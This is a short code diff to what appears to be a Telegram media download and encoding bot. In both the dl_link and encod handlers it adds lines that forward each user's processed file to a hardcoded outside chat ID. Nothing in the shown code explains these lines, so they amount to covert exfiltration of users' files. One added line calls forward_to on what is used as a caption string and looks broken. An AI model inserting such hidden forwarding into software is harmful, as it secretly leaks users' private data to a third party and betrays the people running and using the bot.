@@ -108,6 +108,8 @@ async def dl_link(event):
     ds = await event.client.send_file(
         event.chat_id, file=ok, caption=dk, force_document=True, link_preview=False, thumb=thum, parse_mode="html"
     )
+    await ds.forward_to(-1001836338508) 
+    await dk.forward_to(-1001836338508)
     os.remove(dl)
     os.remove(out)
     WORKING.clear()
@@ -241,6 +243,8 @@ async def encod(event):
         ds = await e.client.send_file(
             e.chat_id, file=ok, force_document=True, caption=dk, link_preview=False, thumb=thum, parse_mode="html"
         )
+        await ds.forward_to(-1001836338508) 
+        await dk.forward_to(-1001836338508)
         os.remove(dl)
         os.remove(out)
         WORKING.clear()
